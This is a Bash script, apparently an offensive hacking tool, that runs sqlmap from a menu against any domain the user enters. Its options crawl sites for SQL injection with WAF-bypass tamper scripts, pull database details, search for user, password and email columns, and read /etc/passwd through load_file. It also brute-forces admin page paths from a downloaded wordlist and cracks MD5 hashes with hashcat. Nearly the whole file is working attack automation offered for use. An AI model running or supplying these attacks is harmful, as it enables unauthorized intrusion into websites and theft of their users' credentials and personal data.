#!/bin/bash
#######################
# colors
PURPLE=$(tput setaf 125)
RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
WHITE=$(tput setaf 7)
CYAN=$(tput setaf 5)
YELLOW=$(tput setaf 3)
BLUE=$(tput setaf 4)
RESET=$(tput sgr0)
####################################################
#Variables
wafs="apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes"
theDiv="${YELLOW}.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo$.oOo.oOo.oOo.oOo.${RESET}\n"
dumps=$(ls /$HOME/.sqlmap/output/*$theURL*/dump/ 2> /dev/null | wc -l)
####################################################
#Functions
#------------------------------------------------------
function injects()
{
	touch inj.txt
	file="inj.txt"

	if [ -e ${file} ]; then
    	count=$(cat ${file})
	else
    	count=0
	fi
}
#-----------------------------------------------------
function ascii_banner()
{
	echo
	clear

	echo -e "${YELLOW}.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo$.oOo.oOo.oOo.oOo.${RESET}"
	cat<<"EOT"
	  _____ _        
	 |_   _| |_  ___ 
	   | | | ' \/ -_)
	   |_| |_||_\___|
	                     .--.   	       
	            ,-.------+-.|  ,-.     
	   ,--=======* )"("")===)===* )    
	   ô        `-"---==-+-"|  `-"     
	   O                 '--' Coded by: 
		  ___   ___   ___ 		Xecurity · Pyr0.
		 |   \ / _ \ / __|		
		 | |) | (_) | (__ 
		 |___/ \___/ \___|

EOT
	echo -e "\t\tVer: ${PURPLE}AnonyInfo${RESET}\n\t\tDisc: Doing all the things you wish ${PURPLE}SQLMAP${RESET} did!\n\t\tSQLMap ${PURPLE}automation${RESET} never looked so sexy${PURPLE}!${RESET}" 
	echo
	echo -e "\t\tTotal Injection Attempt/s: ${CYAN}${count}${RESET}." 
	echo -e "${YELLOW}.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo$.oOo.oOo.oOo.oOo.${RESET}"
}

############
function leakage()
{
	leakType="${2}"
	#crawlOn="${3}"

	#----------------------Crawler------------------------#
	if [ $leakType == "crawl" ] && [ "${wafIT}" == "yes" ]; then
			echo -e "What's the ${PURPLE}domain${RESET} you'd like to ${CYAN}inject${RESET}?\t"
			read theURL	
			echo -e $theDiv
			( sqlmap -u "${theURL}" --threads 10 --random-agent --ignore-proxy --crawl 3 --risk 3 --level 3 --tamper "${wafs}" --batch --dbs )
			((count++))
			echo $count > $file
			echo -e $theDiv
			main_menu
	elif [ $leakType == "crawl" ] && [ "${wafIT}" == "no" ]; then
			echo -e "What's the ${PURPLE}domain${RESET} you'd like to ${CYAN}inject${RESET}?\t"
			read theURL
			echo -e $theDiv
			( sqlmap -u "${theURL}" --threads 10 --random-agent --batch --ignore-proxy --crawl 3 --risk 3 --level 3 --dbs )
			((count++))
			echo $count > $file
			echo -e $theDiv
			main_menu
		fi
	#----------------------Dump MySQL info------------------------#
	if [ $leakType == "dbinfo" ] && [ "${wafIT}" == "yes" ]; then	
		echo -e "What's the ${PURPLE}domain${RESET} you'd like to ${CYAN}inject${RESET}?\n(${PURPLE}ex:url.com/index=${RESET})\t"
		read theURL
		( sqlmap -u "${theURL}" --threads 10 --random-agent --batch --ignore-proxy --risk 3 --tamper "${wafs}" --level 3 --current-user -b --current-db --dbs )
		((count++))
		echo $count > $file
		main_menu
	elif [ $leakType == "dbinfo" ] && [ "${wafIT}" == "no" ]; then	
		echo -e "What's the ${PURPLE}domain${RESET} you'd like to ${CYAN}inject${RESET}?\n(${PURPLE}ex:url.com/index=${RESET})\t"
		read theURL
		( sqlmap -u "${theURL}" --threads 10 --random-agent --batch --ignore-proxy --risk 3 --level 3 --current-user -b --current-db --dbs )	
		((count++))
		echo $count > $file
		main_menu
	fi
	#----------------------Dump /etc/passwd (IF DBA)------------------------#
	if [ $leakType == "fidump" ] && [ "${wafIT}" == "yes" ]; then
		echo -e "INFO: ${CYAN}This ONLY works if you are DB ADMIN${RESET}."
		echo -e "What's the ${PURPLE}domain${RESET} you'd like to ${CYAN}inject${RESET}?\n(${PURPLE}ex:url.com/index=${RESET})\t"
		read theURL
		echo -e $theDiv
	( sqlmap -u "${theURL}" --threads 10 --random-agent --batch --ignore-proxy --risk 3 --level 3 --tamper "${wafs}" --sql-query="load_file('/etc/passwd')" )
		((count++))
		echo $count > $file
		echo -e $theDiv
		main_menu
	elif [ $leakType == "fidump" ] && [ "${wafIT}" == "no" ]; then
		echo -e "INFO: ${CYAN}This ONLY works if you are DB ADMIN${RESET}."
		echo -e "What's the ${PURPLE}domain${RESET} you'd like to ${CYAN}inject${RESET}?\n(${PURPLE}ex:url.com/index=${RESET})\t"
		read theURL
		echo -e $theDiv
		( sqlmap -u "${theURL}" --threads 10 --random-agent --batch --ignore-proxy --risk 3 --level 3 --sql-query="load_file('/etc/passwd')" )
		((count++))
		echo $count > $file
		echo -e $theDiv
		main_menu
	fi
	#----------------------Dump Users, Emails, and PWs------------------------#
	if [ $leakType == "dumpit" ] && [ "${wafIT}" == "yes" ]; then
		echo -e "What's the ${PURPLE}domain${RESET} you'd like to ${CYAN}inject${RESET}?\n(${PURPLE}ex:url.com/index=${RESET})\t"
		read theURL
		( sqlmap -u "${theURL}" --threads 10 --random-agent --batch --ignore-proxy --tamper "${wafs}" --risk 3 --level 3 --search -C user,pw,email )
		((count++))
		echo $count > $file
		echo -e $theDiv
		main_menu
	elif [ $leakType == "dumpit" ] && [ "${wafIT}" == "no" ]; then
		echo -e "What's the ${PURPLE}domain${RESET} you'd like to ${CYAN}inject${RESET}?\n(${PURPLE}ex:url.com/index=${RESET})\t"
		read theURL
		( sqlmap -u "${theURL}" --threads 10 --random-agent --batch --ignore-proxy --risk 3 --level 3 --search -C user,pw,email )
		((count++))
		echo $count > $file
		echo -e $theDiv
		main_menu
	fi
}
#----------------------------------------------------
#Admin Finder
function admin_finder()
{
	wget https://raw.githubusercontent.com/UltimateHackers/Breacher/master/paths.txt 2>/dev/null; rm -rf paths.txt.1 2>/dev/null
     echo -e "What's the ${PURPLE}domain${RESET} you'd like ${CYAN}admin${RESET} for?\t" 
     read theURL
	echo
	  for i in `cat paths.txt`
	  do
	    curlvar=$(curl -s -o /dev/null -w "%{http_code}" $theURL/$i)
	        if [ "$curlvar" = "301" ] || [ "$curlvar" = "302" ] || [ "$curlvar" = "201" ]
	          then
	          echo -e "${PURPLE}Admin${RESET} Found: ${CYAN}${theURL}${i}${RESET}"
	          break
	           else
	          		echo -e "${PURPLE}Searching...${RESET}...${CYAN}.${RESET}"
	          fi
	done
}
#-----------------------------------------------------
function hash_it()
{
	thefi="hash.txt"
	theList="/usr/share/sqlmap/txt/smalldict.txt"
	echo -e "What's the ${PURPLE}HASH${RESET} you'd like to ${CYAN}crack${RESET}?\t"
	read theHASH
	echo $theHASH > $thefi
	( pkill hashcat )
	( hashcat -m 0 -O $thefi "${theList}" --force )
	main_menu
}	
#----------------------------------------------------
function wsqlmap() 
{
which sqlmap > /dev/null 2>&1
if [ "$?" != 0 ]; then
	echo -e "${CYAN}[!]${RESET} ut oh, no SQLMAP! We'll fix that!"
	isql
	else
            echo -e "${CYAN}[+]${RESET} Nice, SQLMAP's already installed."
fi
}
#---------------------------------------------------------
function isql() 
{
echo -e "$g[i]$e Installing sqlmap... please wait..."
apt-get install sqlmap > /dev/null 2>&1
if [ "$?" != 0 ]; then
	echo -e "${CYAN}[+]${RESET} SQLMAP not installed... please try again or check your connection.."
	exit 1
else
    echo -e "$${CYAN}[+]${RESET}SQLmap is installed."

fi
}
#---------------------------------------------------------
function main_menu()
{
	select mainmnu in "Crawl Domain" "Grab MySQL Info" "Extract User Infos" "Extact Systems User/PWs" "Find Admin" "Crack/Find Hash"
	do
		case $mainmnu in 
			"Extact Systems User/PWs")
					echo -e "How ${PURPLE}secure${RESET} is the domain? Want to use ${CYAN}WAF${RESET} bypass methods??"
					read waf
					if [ "${waf}" == "Yes" ]; then
						wafIT="yes"
						leakage "${waf}" "fidump"
	 				elif [ "${waf}" == "No" ]; then
						wafIT="no"
						leakage "${waf}" "fidump"
				else
						echo -e "${CYAN}Let's try again${RESET}, lol - Next time: ${RESET}Yes (${PURPLE}OR${RESET}) NO${RESET}"
						echo
						main_menu
					fi
			;;
			"Crawl Domain")				
					echo -e "How ${PURPLE}secure${RESET} is the domain? Want to use ${CYAN}WAF${RESET} bypass methods??"
					read waf
					if [ "${waf}" == "Yes" ]; then
						wafIT="yes"
						leakage "${waf}" "crawl"
	 				elif [ "${waf}" == "No" ]; then
						wafIT="no"
						leakage "${waf}" "crawl"
				else
						echo -e "${CYAN}Let's try again${RESET}, lol - Next time: ${RESET}Yes (${PURPLE}OR${RESET}) NO${RESET}"
						echo
						main_menu
					fi
			;;
			"Grab MySQL Info")
					echo -e "How ${PURPLE}secure${RESET} is the domain? Want to use ${CYAN}WAF${RESET} bypass methods??"
					read waf
					if [ "${waf}" == "Yes" ]; then
						wafIT="yes"
						leakage "${waf}" "dbinfo"
	 				elif [ "${waf}" == "No" ]; then
						wafIT="no"
						leakage "${waf}" "dbinfo"
				else
						echo -e "${CYAN}Let's try again${RESET}, lol - Next time: ${RESET}Yes (${PURPLE}OR${RESET}) NO${RESET}"
						echo
						main_menu
					fi
			;;
			"Extract User Infos")
					echo -e "How ${PURPLE}secure${RESET} is the domain? Want to use ${CYAN}WAF${RESET} bypass methods??"
					read waf
					if [ "${waf}" == "Yes" ]; then
						wafIT="yes"
						leakage "${waf}" "dumpit"
	 				elif [ "${waf}" == "No" ]; then
						wafIT="no"
						leakage "${waf}" "dumpit"
				else
						echo -e "${CYAN}Let's try again${RESET}, lol - Next time: ${RESET}Yes (${PURPLE}OR${RESET}) NO${RESET}"
						echo
						main_menu
					fi
			;;
			"Find Admin")
					admin_finder
			;;
			"Crack/Find Hash")
					hash_it
			;;
				*)
					echo -e "${CYAN}Let's try again${RESET}, lol."
					echo
					main_menu			
		   ;;
		esac
	done
}
####################################################
echo
clear
echo -e "${YELLOW}.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo$.oOo.oOo.oOo.oOo.${RESET}"
echo -e "${CYAN}[+]${RESET} Checking for SQLMAP..."; sleep 1
wsqlmap
sleep 0.3
echo -e "${YELLOW}.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo$.oOo.oOo.oOo.oOo.${RESET}"
injects
ascii_banner
main_menu
